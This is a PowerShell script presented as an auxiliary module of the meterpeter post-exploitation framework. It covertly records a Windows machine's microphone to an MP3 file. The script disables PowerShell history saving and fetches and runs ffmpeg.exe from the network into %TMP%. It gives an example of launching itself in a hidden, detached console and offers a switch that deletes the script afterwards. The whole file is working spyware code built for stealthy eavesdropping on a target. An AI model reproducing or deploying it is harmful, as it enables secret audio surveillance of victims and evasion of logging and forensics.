﻿<#
.SYNOPSIS
   records microphone audio [MP3] until -rectime <sec> its reached

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: ffmpeg.exe {auto-download}
   Optional Dependencies: Curl, WinGet {native}
   PS cmdlet Dev version: v2.2.8

.DESCRIPTION
   Auxiliary Module of meterpeter v2.10.14.1 that records native
   microphone audio until -rectime <seconds> parameter its reached

.NOTES
   The first time this cmdlet runs, it checks if ffmpeg.exe its present in
   -workingdir "$Env:TMP". If not, it downloads it from GitHub repo (download
   takes aprox 2 minutes) and execute it, at 2º time run it will start recording
   audio instantly without the need to download or install ffmpeng codec again.

   [-installer 'Store|GitHub']
   -installer 'Store'   - download\INSTALL\execute ffmpeg.exe using WinGet API
   -installer 'GitHub'  - download\execute ffmpeg.exe from working dir (%TMP%)

   [-loglevel 'info|verbose|error|warning|panic|quiet']
   -loglevel 'quiet'   - supresses all stdout displays [ffmpeg]
   -loglevel 'verbose' - display stdout verbose report [ffmpeg]

   [-forceenvpath] switch appends -workingdir 'directory' to USER
   Environment path if invoked together with -download 'GitHub'
   This allows for ffmpeg alias to be invoked in current shell.

.Parameter workingDir
   Cmdlet working directory (default: $Env:TMP)

.Parameter Mp3Name
   The audio file name (default: AudioClip.mp3)

.Parameter RecTime
   Record audio for xx seconds (default: 10)

.Parameter Installer
   Install ffmpeg from Store|GitHub (default: GitHub)

.Parameter Random
   Switch that random generates Mp3 filename

.Parameter LogLevel
   Set ffmpeg stdout reports level (default: info)

.Parameter LogFile
   Switch that creates cmdlet execution logfile

.Parameter ForceEnvPath
   Import ffmpeg to environment path [installer:GitHub]

.Parameter AutoDelete
   Switch that auto-deletes this cmdlet in the end

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -workingDir "$pwd"
   Use current directory as working directory

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -rectime '13' -loglevel 'verbose'
   Use stdout verbose reports, record audio for 13 seconds

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -rectime '28' -Installer 'store'
   Install ffmpeg from MSstore, record audio for 28 seconds

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -random -Installer 'GitHub'
   Install ffmpeg from GitHub, random generate MP3 filename

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -workingdir "$Env:TMP" -forceenvpath
   Use %TMP% has working dir, Import ffmpeg to Environment path [$Env:PATH]

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -uninstall -installer 'store'
   UnInstall ffmpeg from MSstore [local uninstallation]

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -uninstall -installer 'github'
   delete ffmpeg path from Environment paths [$Env:PATH]

.EXAMPLE
   PS C:\> Start-Process -windowstyle hidden powershell -argumentlist "-file rec_audio.ps1 -rectime 60 -loglevel quiet -autodelete"
   Execute this cmdlet for 60 seconds in an hidden console detach from parent process (orphan process)

.INPUTS
   None. You cannot pipe objects into rec_audio.ps1

.OUTPUTS
   [20:42] 🔌 record native microphone audio 🔌
   [20:42] downloading : ffmpeg-release-essentials.zip

     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                    Dload  Upload   Total   Spent    Left  Speed
   100   284  100   284    0     0    314      0 --:--:-- --:--:-- --:--:--   314
   100 83.4M  100 83.4M    0     0   614k      0  0:02:19  0:02:19 --:--:--  545k

   [20:44] executing   : ffmpeg.exe from 'C:\Users\pedro\AppData\Local\Temp'
   [aist#0:0/pcm_s16le @ 0000026dcda68a00] Guessed Channel Layout: stereo
   Input #0, dshow, from 'audio=Microfone (Conexant SmartAudio HD)':
     Duration: N/A, start: 39636.041000, bitrate: 1411 kb/s
     Stream #0:0: Audio: pcm_s16le, 44100 Hz, stereo, s16, 1411 kb/s
   Stream mapping:
     Stream #0:0 -> #0:0 (pcm_s16le (native) -> mp3 (libmp3lame))
   Press [q] to stop, [?] for help
   Output #0, mp3, to 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3':
     Metadata:
       TSSE            : Lavf60.22.101
     Stream #0:0: Audio: mp3, 44100 Hz, mono, s16p, 128 kb/s
         Metadata:
           encoder         : Lavc60.40.100 libmp3lame
   [out#0/mp3 @ 0000026dcdb066c0] video:0KiB audio:78KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.575715%
   size=      79KiB time=00:00:05.00 bitrate= 129.1kbits/s speed=0.909x
   [20:45] MP3file -> 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3'

.LINK
   https://github.com/r00t-3xp10it/redpil
   https://img.ly/blog/ultimate-guide-to-ffmpeg
   https://learn.microsoft.com/en-us/windows/package-manager/winget
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Mp3Name="AudioClip.mp3",
   [string]$WorkingDir="$Env:TMP",
   [string]$Installer="GitHub",
   [string]$LogLevel="info",
   [switch]$ForceEnvPath,
   [switch]$AutoDelete,
   [switch]$UnInstall,
   [int]$RecTime='10',
   [switch]$LogFile,
   [switch]$Random
)


$cmdletver = "v2.2.8"
$IPath = (Get-Location).Path.ToString()
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "rec_audio $cmdletver"

$Banner = @"
 ____  ____  ____      ____  __ __  ____  _  ____ 
| () )| ===|/ (__     / () \|  |  || _) \| |/ () \
|_|\_\|____|\____)   /__/\__\\___/ |____/|_|\____/
"@;

write-host $Banner -ForegroundColor Blue
write-host "♟ GitHub:https://github.com/r00t-3xp10it/redpill♟" -ForegroundColor DarkYellow

function Invoke-CurrentTime ()
{
   ## Get current Hour:Minute format
   $global:CurrTime = (Get-Date -Format 'HH:mm')
}

## Set the default record time (in seconds) -> [max=3Hours|min=8Seconds]
If(([string]::IsNullOrEmpty($RecTime)) -or ($RecTime -gt 10800) -or ($RecTime -lt 8))
{
   [int]$RecTime='10'
}

cd "$WorkingDir"
Invoke-CurrentTime
write-host "`n[$global:CurrTime] 🔌 record native microphone audio 🔌" -ForegroundColor Green
If($LogFile.IsPresent){echo "[$global:CurrTime] 🔌 record native microphone audio 🔌" > "$WorkingDir\ffmpeg.log"}


If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - delete ffmpeg from Environment path [$Env:PATH]

   .OUTPUTS
      [20:42] 🔌 record native microphone audio 🔌
      [20:42] delete ffmpeg from environment path

      Selected for deletion
      ---------------------
      C:\Users\pedro\AppData\Local\Temp

      [20:43] Delete Environment Path Value? (yes|no): yes
      [20:43] Setting new Environment Paths value

      Current Environment paths
      -------------------------
      C:\WINDOWS\system32\
      C:\WINDOWS\
      C:\WINDOWS\System32\Wbem\
      C:\WINDOWS\System32\WindowsPowerShell\v1.0\
      C:\WINDOWS\System32\OpenSSH\
      C:\Users\pedro\AppData\Local\Programs\Python\Python39\Scripts\
      C:\Users\pedro\AppData\Local\Programs\Python\Python39\
      C:\Users\pedro\AppData\Local\Microsoft\WindowsApps

      [20:43] FFmpeg environment path successfuly deleted!
   #>

   Invoke-CurrentTime
   write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
   write-host "delete ffmpeg from environment path"

   ## Import the machine's PATH variable into the current session
   $Env:PATH = [Environment]::GetEnvironmentVariable("Path","USER")
   $RawPaths = ([Environment]::GetEnvironmentVariables()).Path
   If($RawPaths -match '^(C:\\WINDOWS\\system32\\|C:\\WINDOWS\\system32|C:\\WINDOWS\\System32\\Wbem\\|C:\\WINDOWS\\System32\\Wbem|C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\|C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0)')
   {
      $Parsedata = $RawPaths -split ';'
      write-host "[ABORT] cant find ffmpeg Environement path!" -ForegroundColor Red
      write-host "`nCurrent Environement Paths" -ForegroundColor Green
      write-host "--------------------------"
      echo $Parsedata

      write-host ""
      cd "$IPath"
      return
   }

   write-host "`nSelected for deletion"
   write-host "---------------------"
   write-host $($RawPaths -split ';')[0] -ForegroundColor Red

   ## Parse data [Environment Path]
   $DeleteThisPath = $($RawPaths -split ';')[0]                        ## C:\Users\pedro\AppData\Local\Temp
   $ParseBackSlash = $DeleteThisPath -replace '\\','\\'                ## C:\\Users\\pedro\\AppData\\Local\\Temp
   $NewEnvironementPaths = $RawPaths -replace "${ParseBackSlash};",""  ## C:\Users\pedro\AppData\Local\Temp;

   Invoke-CurrentTime
   ## Make sure we are deleting the correct Environment Path Value!
   write-host "`n[$global:CurrTime] Delete Environment Path Value? (yes|no): " -ForegroundColor Red -NoNewline
   $Choise = Read-Host

   If($Choise -imatch '^(y|yes)$')
   {
      ## Set new Environment Path value
      [Environment]::SetEnvironmentVariable(
         "PATH","$NewEnvironementPaths","USER"
      )

      write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
      write-host "Setting new Environment Paths value"
   }

   Start-Sleep -Milliseconds 800
   ## Import the machine's PATH variable into the current session
   $Env:PATH = [Environment]::GetEnvironmentVariable("Path","USER")

   ## Display onscreen 'Current Environment Paths' now
   $CurrentPaths = ([Environment]::GetEnvironmentVariables()).Path
   $ParseDataPat = $CurrentPaths -split ';'
   write-host "`nCurrent Environement Paths" -ForegroundColor Green
   write-host "--------------------------"
   echo $ParseDataPat

   Invoke-CurrentTime
   write-host "[$global:CurrTime] FFmpeg environment path successfuly deleted!`n" -ForegroundColor Green
   If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
   cd "$IPath"
   return 
}

If(($UnInstall.IsPresent) -and ($Installer -match '^(Store|Mtore|WinGet)$'))
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - UnInstall Pacakage ffmpeg from msstore [local]

   .OUTPUTS
      [20:42] 🔌 record native microphone audio 🔌
      Encontrado FFmpeg [Gyan.FFmpeg]
      Iniciando a desinstalação do pacote...
      Limpando o diretório de instalação...
      Desinstalado com êxito
   #>

   ## Search for FFmpeg Pacakage locally
   $IsAvailable = (Winget list|findstr /C:"FFmpeg")
   If([string]::IsNullOrEmpty($IsAvailable))
   {
      Invoke-CurrentTime
      write-host "[$global:CurrTime] Error: program 'FFmpeg' not found in msstore [local]`n" -ForegroundColor Red
      If($LogFile.IsPresent){echo "[$global:CurrTime] Error: program 'FFmpeg' not found in msstore [local]" >> "$WorkingDir\ffmpeg.log"}
      If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
      cd "$IPath"
      return      
   }

   ## Silent Uninstall FFmpeg program from local machine
   winget uninstall --name "FFmpeg" --id "Gyan.FFmpeg" --silent --force --purge --disable-interactivity
   If($? -match 'false')
   {
      Invoke-CurrentTime
      write-host "[$global:CurrTime] Error: fail Uninstalling program 'FFmpeg' id 'Gyan.FFmpeg'" -ForegroundColor Red
      If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail Uninstalling program 'FFmpeg' id 'Gyan.FFmpeg'" >> "$WorkingDir\ffmpeg.log"}
   }

   If($AutoDelete.IsPresent)
   {
      Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
   }

   write-host ""
   cd "$IPath"
   return
}


If($Installer -imatch '^(Store|MStore|WinGet)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download ffmpeg.exe from WinGet [store]

   .OUTPUTS
      [20:42] 🔌 record native microphone audio 🔌
      [20:42] searching program 'FFmpeg' [local|remote]
      Encontrado FFmpeg [Gyan.FFmpeg] Versão 6.1.1
      Este aplicativo é licenciado para você pelo proprietário.
      A Microsoft não é responsável por, nem concede licenças a pacotes de terceiros.
      Baixando https://github.com/GyanD/codexffmpeg/releases/download/6.1.1/ffmpeg-6.1.1-full_build.zip
        ██████████████████████████████   154 MB /  154 MB
      Hash do instalador verificado com êxito
      Extraindo arquivo...
      Arquivo extraído com êxito
      Iniciando a instalação do pacote...
      Variável de ambiente do caminho modificada; reinicie seu shell para usar o novo valor.
      O alias da linha de comando foi adicionado: "ffmpeg"
      O alias da linha de comando foi adicionado: "ffplay"
      O alias da linha de comando foi adicionado: "ffprobe"
      Instalado com êxito
   #>

   write-host "[$global:CurrTime] searching program 'FFmpeg' [local|remote]" -ForegroundColor Green
   If($LogFile.IsPresent){echo "[$global:CurrTime] searching program 'FFmpeg' [local|remote]" >> "$WorkingDir\ffmpeg.log"}

   ## Make sure Pacakage its not already intalled
   $CheckLocal = (winget list|findstr /C:"FFmpeg")
   If(-not([string]::IsNullOrEmpty($CheckLocal)))
   {
      Invoke-CurrentTime
      write-host "[" -NoNewline;write-host "$global:CurrTime" -ForegroundColor Red -NoNewline;
      write-host "] " -NoNewline;write-host "MStore program 'FFmpeg' installed [local]" -ForegroundColor Red
      If($LogFile.IsPresent){echo "[$global:CurrTime] MStore program 'FFmpeg' installed! [local]" >> "$WorkingDir\ffmpeg.log"}
      Start-Sleep -Seconds 1   
   }
   Else
   {
      ## Search for Pacakage in microsoft store
      $IsAvailable = (Winget search --name "FFmpeg" --exact|Select-String -Pattern "Gyan.FFmpeg")
      If([string]::IsNullOrEmpty($IsAvailable))
      {
         Invoke-CurrentTime
         write-host "[$global:CurrTime] Error: program 'FFmpeg' not found in msstore!`n" -ForegroundColor Red
         If($LogFile.IsPresent){echo "[$global:CurrTime] Error: program 'FFmpeg' not found in msstore!`n" >> "$WorkingDir\ffmpeg.log"}
         If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
         cd "$IPath"
         return      
      }

      ## Silent install program from microsoft store
      winget install --name "FFmpeg" --id "Gyan.FFmpeg" --silent --force --accept-package-agreements --accept-source-agreements --disable-interactivity
      If($? -match 'false')
      {
         Invoke-CurrentTime
         write-host "[$global:CurrTime] Error: fail installing program 'FFmpeg' id 'Gyan.FFmpeg' from msstore`n" -ForegroundColor Red
         If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail installing program 'FFmpeg' id 'Gyan.FFmpeg' from msstore`n" >> "$WorkingDir\ffmpeg.log"}
         If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
         cd "$IPath"
         return      
      }

      If($LogLevel -imatch '^(info|verbose|error|warning|panic)$'){write-host ""}
   }
}
Else
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download ffmpeg.exe from www.gyan.dev [ZIP]

   .LINK
      https://adamtheautomator.com/install-ffmpeg

   .OUTPUTS
      [20:42] 🔌 record native microphone audio 🔌
      [20:42] downloading : ffmpeg-release-essentials.zip

        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                       Dload  Upload   Total   Spent    Left  Speed
      100   284  100   284    0     0    252      0  0:00:01  0:00:01 --:--:--   252
      100 83.4M  100 83.4M    0     0   318k      0  0:04:27  0:04:27 --:--:-- 1065k
   #>

   ## Download ffmpeg.exe from GitHub repository
   If(-not(Test-Path "$WorkingDir\ffmpeg.exe"))
   {
      Invoke-CurrentTime
      ## Download ffmpeg using curl {faster}
      write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
      write-host "downloading : " -NoNewline;write-host "ffmpeg-release-essentials.zip" -ForegroundColor Green
      If($LogFile.IsPresent){echo "[$global:CurrTime] downloading : ffmpeg-release-essentials.zip" >> "$WorkingDir\ffmpeg.log"}
      If($LogLevel -imatch '^(info|verbose|error|warning|panic)$'){write-host ""}

      If($LogLevel -imatch '^(quiet)$')
      {
         curl.exe -L 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -o "$WorkingDir\ffmpeg-release-essentials.zip" --silent
      }
      Else
      {
         curl.exe -L 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -o "$WorkingDir\ffmpeg-release-essentials.zip"
      }

      If(-not(Test-Path "$WorkingDir\ffmpeg-release-essentials.zip"))
      {
         Invoke-CurrentTime
         write-host "[$global:CurrTime] Error: fail downloading $WorkingDir\ffmpeg-release-essentials.zip`n" -ForegroundColor Red
         If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail downloading $WorkingDir\ffmpeg-release-essentials.zip`n" >> "$WorkingDir\ffmpeg.log"}
         If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
         cd "$IPath"
         return
      }

      Invoke-CurrentTime
      ## Expand archive in working directory
      Expand-Archive "$WorkingDir\ffmpeg-release-essentials.zip" -DestinationPath "$WorkingDir" -force
      If($LogFile.IsPresent){echo "[$global:CurrTime] Expand-Zip  : '$WorkingDir\ffmpeg-release-essentials.zip'" >> "$WorkingDir\ffmpeg.log"}
      If(-not(Test-Path "$WorkingDir\ffmpeg-6.1.1-essentials_build"))
      {
         Invoke-CurrentTime
         write-host "[$global:CurrTime] Error: fail expanding ffmpeg-release-essentials.zip archive`n" -ForegroundColor Red
         If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail expanding ffmpeg-release-essentials.zip archive`n" >> "$WorkingDir\ffmpeg.log"}
         If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
         cd "$IPath"
         return
      }

      ## Move ffmpeg.exe from ffmpeg-master-latest-win64-gpl directory to 'cmdlet working directory'
      Move-Item -Path "$WorkingDir\ffmpeg-6.1.1-essentials_build\bin\ffmpeg.exe" -Destination "$WorkingDir\ffmpeg.exe" -Force

      ## CleanUp of files left behind
      Remove-Item -Path "$WorkingDir\ffmpeg-6.1.1-essentials_build" -Force -Recurse
      Remove-Item -Path "$WorkingDir\ffmpeg-release-essentials.zip" -Force
      If($LogLevel -imatch '^(info|verbose|error|warning|panic)$'){write-host ""}
   }

   ## Make sure we have downloaded ffmpeg.exe!
   If(-not(Test-Path "$WorkingDir\ffmpeg.exe"))
   {
      Invoke-CurrentTime
      write-host "[$global:CurrTime] Error: fail downloading ffmpeg.exe to '$WorkingDir'`n" -ForegroundColor Red
      If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail downloading ffmpeg.exe to '$WorkingDir'`n" >> "$WorkingDir\ffmpeg.log"}
      If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
      cd "$IPath"
      return
   }
}


## Add Assemblies
Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system;
   
function GetFriendlyName($Audioid)
{
   $MMDEVAPI = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$Audioid";
   return (Get-ItemProperty $MMDEVAPI).FriendlyName
}

$Audioid = [audio]::GetDefault(1);
$MicName = "$(GetFriendlyName $Audioid)";

If($Random.IsPresent)
{
   ## Random .MP3 file name creation
   $RandomN = [IO.Path]::GetFileNameWithoutExtension([System.IO.Path]::GetRandomFileName())
   $MP3Path = "$WorkingDir" + "\" + "$RandomN" + ".mp3" -join ''
}
Else
{
   $MP3Path = "$WorkingDir" + "\" + "$mp3Name" -join ''
}

If($Installer -imatch '^(Store|MStore|WinGet)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Execute ffmpeg.exe from WinGet directory [MStore]

   .OUTPUTS
      [20:44] executing   : ffmpeg program (WinGet Location)
      [aist#0:0/pcm_s16le @ 0000026dcda68a00] Guessed Channel Layout: stereo
      Input #0, dshow, from 'audio=Microfone (Conexant SmartAudio HD)':
        Duration: N/A, start: 39636.041000, bitrate: 1411 kb/s
        Stream #0:0: Audio: pcm_s16le, 44100 Hz, stereo, s16, 1411 kb/s
      Stream mapping:
        Stream #0:0 -> #0:0 (pcm_s16le (native) -> mp3 (libmp3lame))
      Press [q] to stop, [?] for help
      Output #0, mp3, to 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3':
        Metadata:
          TSSE            : Lavf60.22.101
        Stream #0:0: Audio: mp3, 44100 Hz, mono, s16p, 128 kb/s
            Metadata:
              encoder         : Lavc60.40.100 libmp3lame
      [out#0/mp3 @ 0000026dcdb066c0] video:0KiB audio:78KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.575715%
      size=      79KiB time=00:00:05.00 bitrate= 129.1kbits/s speed=0.909x 
   #>

   Invoke-CurrentTime
   write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
   write-host "executing   : " -NoNewline;write-host "ffmpeg program (WinGet Location)" -ForegroundColor Green
   $SearchForFFmpeg = (GCI -Path "$Env:LOCALAPPDATA\Microsoft\winget\Packages" -Recurse|Select-Object *).FullName|Where-Object{$_ -match '(ffmpeg.exe)$'}|Select-Object -Last 1
   If($LogFile.IsPresent){echo "[$global:CurrTime] executing   : ffmpeg program (WinGet Location)" >> "$WorkingDir\ffmpeg.log"}
   $FFmpegInstallPath = $SearchForFFmpeg -replace '\\ffmpeg.exe',''

   If([string]::IsNullOrEmpty($FFmpegInstallPath))
   {
      Invoke-CurrentTime
      write-host "[$global:CurrTime] Error: cmdlet can't retrieve ffmpeg full path location`n" -ForegroundColor Red
      If($LogFile.IsPresent){echo "[$global:CurrTime] Error: cmdlet can't retrieve ffmpeg full path location`n" >> "$WorkingDir\ffmpeg.log"}
      If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
      cd "$IPath"
      return
   }

   cd "$FFmpegInstallPath"
   ## cd "$Env:LOCALAPPDATA\Microsoft\WinGet\Packages\Gyan.FFmpeg_Microsoft.Winget.Source_8wekyb3d8bbwe\ffmpeg-6.1.1-full_build\bin"
   .\ffmpeg.exe -y -hide_banner -loglevel "$LogLevel" -f dshow -i audio="$MicName" -filter_complex "volume=1.5" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
}
Else
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Execute ffmpeg.exe from working directory [$Env:TMP]

   .OUTPUTS
      [20:44] executing   : ffmpeg.exe from 'C:\Users\pedro\AppData\Local\Temp'
      [aist#0:0/pcm_s16le @ 0000026dcda68a00] Guessed Channel Layout: stereo
      Input #0, dshow, from 'audio=Microfone (Conexant SmartAudio HD)':
        Duration: N/A, start: 39636.041000, bitrate: 1411 kb/s
        Stream #0:0: Audio: pcm_s16le, 44100 Hz, stereo, s16, 1411 kb/s
      Stream mapping:
        Stream #0:0 -> #0:0 (pcm_s16le (native) -> mp3 (libmp3lame))
      Press [q] to stop, [?] for help
      Output #0, mp3, to 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3':
        Metadata:
          TSSE            : Lavf60.22.101
        Stream #0:0: Audio: mp3, 44100 Hz, mono, s16p, 128 kb/s
            Metadata:
              encoder         : Lavc60.40.100 libmp3lame
      [out#0/mp3 @ 0000026dcdb066c0] video:0KiB audio:78KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.575715%
      size=      79KiB time=00:00:05.00 bitrate= 129.1kbits/s speed=0.909x 
   #>

   Invoke-CurrentTime
   write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline;write-host "executing   : " -NoNewline
   write-host "ffmpeg.exe" -ForegroundColor Green -NoNewline;write-host " from '" -NoNewline
   write-host "$WorkingDir" -ForegroundColor Green -NoNewline;write-host "'"
   If($LogFile.IsPresent){echo "[$global:CurrTime] executing   : ffmpeg.exe from '$WorkingDir'" >> "$WorkingDir\ffmpeg.log"}
   .\ffmpeg.exe -y -hide_banner -loglevel "$LogLevel" -f dshow -i audio="$MicName" -filter_complex "volume=1.5" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
}


If(($ForceEnvPath.IsPresent) -and ($Installer -imatch '^(GitHub)$'))
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Import ffmpeg to USER path [$Env:PATH]

   .LINK
      https://adamtheautomator.com/install-ffmpeg
      https://www.sharepointdiary.com/2021/05/powershell-set-environment-variable.html

   .OUTPUTS
      [20:45] ENVPATH -> Prepend FFmpeg folder path to the path variable
      [20:45] ENVPATH -> Import user PATH variable into current session.
      [DELETE VARIABLES] Windows+R: 'rundll32.exe sysdm.cpl,EditEnvironmentVariables'

      [20:45] MP3file -> 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3'
   #>

   Invoke-CurrentTime
   $Filter = "$WorkingDir" -replace '\\','\\'
   If(-not(([Environment]::GetEnvironmentVariables()).Path -match "$Filter"))
   {
      ## Prepend the FFmpeg folder path to the path variable
      If($LogLevel -imatch '^(info|verbose|error|warning|panic)$'){write-host ""}
      write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
      write-host "ENVPATH -> Prepend FFmpeg folder path to the path variable"

      [Environment]::SetEnvironmentVariable(
         "PATH","${WorkingDir}\;$([Environment]::GetEnvironmentVariable('PATH','USER'))","USER"
      )

      ## import the machine's PATH variable into the current session
      write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
      write-host "ENVPATH -> Import user PATH variable into current session."
      $Env:PATH = [Environment]::GetEnvironmentVariable("Path","USER")

      Invoke-CurrentTime
      ## MANUAL DELETE Environment Variables instructions
      write-host "[DELETE VARIABLES] Windows+R: 'rundll32.exe sysdm.cpl,EditEnvironmentVariables'" -ForegroundColor DarkYellow
      If($LogFile.IsPresent){echo "[$global:CurrTime] ENVPATH     : FFmpeg alias added to USER environement path" >> "$WorkingDir\ffmpeg.log"}
      If($LogLevel -imatch '^(info|verbose|error|warning|panic)$'){write-host ""}
   }
   Else
   {
      ## FFmpeg already present in USER environement path
      write-host "[" -NoNewline;write-host "$global:CurrTime" -ForegroundColor Red -NoNewline
      write-host "] ENVPATH -> " -NoNewline;write-host "FFmpeg already present in USER environement path" -ForegroundColor Red

      ## MANUAL DELETE EnvironmentVariables instructions
      write-host "[DELETE VARIABLES] Windows+R: 'rundll32.exe sysdm.cpl,EditEnvironmentVariables'" -ForegroundColor DarkYellow
      If($LogFile.IsPresent){echo "[$global:CurrTime] ENVPATH     : FFmpeg already present in USER environement path" >> "$WorkingDir\ffmpeg.log"}
   }
}

Invoke-CurrentTime
## Make sure we have .MP3 file
If(Test-Path -Path "$MP3Path")
{
   write-host "[" -NoNewline
   write-host "$global:CurrTime" -ForegroundColor Red -NoNewline
   write-host "] MP3file --> '" -NoNewline
   write-host "$MP3Path" -ForegroundColor Red -NoNewline
   write-host "'"

   If($LogFile.IsPresent)
   {
      echo "[$global:CurrTime] MP3file     : '$MP3Path'`n" >> "$WorkingDir\ffmpeg.log"
   }
}
Else
{
   If($LogFile.IsPresent)
   {
      echo "[$global:CurrTime] Error: fail to create '$MP3Path'`n" >> "$WorkingDir\ffmpeg.log"
   }
}


cd "$IPath" ## Return to start directory
## Meterpeter CleanUp
If($AutoDelete.IsPresent)
{
   ## Auto Delete this cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}
write-host ""
exit